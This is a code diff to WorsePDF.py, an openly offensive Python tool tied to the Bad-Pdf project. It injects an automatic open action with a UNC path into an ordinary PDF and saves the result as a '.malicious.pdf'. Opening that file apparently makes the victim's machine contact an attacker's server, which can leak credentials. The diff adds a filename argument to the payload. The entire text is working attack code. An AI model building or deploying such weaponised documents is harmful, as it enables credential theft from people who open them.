@@ -9,8 +9,8 @@
 
 import sys
 
-def AddPayload(Data,ip):
-    Payload = '/AA <</O <</F (\\\\\\\\' + ip + '\\\\test)/D [ 0 /Fit]/S /GoToE>>>>'
+def AddPayload(Data,ip,filename):
+    Payload = '/AA <</O <</F (\\\\\\\\' + ip + '\\\\' + filename + ')/D [ 0 /Fit]/S /GoToE>>>>'
     index1 = Data.find('/Parent') + 13    
 #    print "%x" % index1
     Newdata = Data[0:index1] + Payload + Data[index1:]   
@@ -24,13 +24,14 @@ if __name__ == "__main__":
     print "    https://github.com/deepzec/Bad-Pdf"    
     print "Author: 3gstudent\n"
 
-    if len(sys.argv)!=3:
+    if len(sys.argv)!=4:
         print ('Usage:')
-        print ('    WorsePDF.py <normal PDF file Path> <ServerIP>')   
+        print ('    WorsePDF.py <normal PDF file Path> <ServerIP> <filename>')   
         sys.exit(0)    
 
     print "[*]NormalPDF: %s" % sys.argv[1]
     print "[*]ServerIP: %s" % sys.argv[2]
+    print "[*]Filename: %s" % sys.argv[3]
     
     file_object = open(sys.argv[1],'rb')
     try:
@@ -38,7 +39,7 @@ if __name__ == "__main__":
     finally:
          file_object.close()
 
-    Newdata = AddPayload(all_the_text,sys.argv[2])
+    Newdata = AddPayload(all_the_text,sys.argv[2],sys.argv[3])
     MaliciousPath = sys.argv[1] + '.malicious.pdf'
     
     print "[+]MaliciousPDF: %s" % MaliciousPath   
